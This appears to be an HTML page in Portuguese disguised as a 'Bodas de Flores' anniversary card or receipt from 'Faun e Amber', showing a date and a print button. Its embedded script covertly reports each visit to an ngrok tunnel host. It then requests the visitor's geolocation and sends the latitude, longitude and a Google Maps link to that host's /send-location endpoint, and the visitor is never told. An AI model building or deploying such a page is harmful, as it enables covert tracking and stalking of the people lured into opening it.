<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bodas de Flores</title>
  <link rel="stylesheet" href="styles.css" />
</head>

<body>
  <div class="background-split">
    <div class="left"></div>
    <div class="right"></div>
  </div>
  <div class="comprovante-container">
    <h1>Bodas de Flores</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>De:</span> Faun e Amber</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

  </div>

  <script>
    // Envia mensagem de acesso ao servidor
    fetch("https://9d7a-2804-d59-8c25-2f00-b4fa-f6d4-f439-2bab.ngrok-free.app/send-location", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: "O site foi acessado."
      })
    });
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }
    });

    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();

    const dataFormatada = `${dia}/${mes}/${ano}`;

    document.getElementById("data-atual").textContent = dataFormatada;

    console.log(dataAtual)

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://9d7a-2804-d59-8c25-2f00-b4fa-f6d4-f439-2bab.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>

</html>
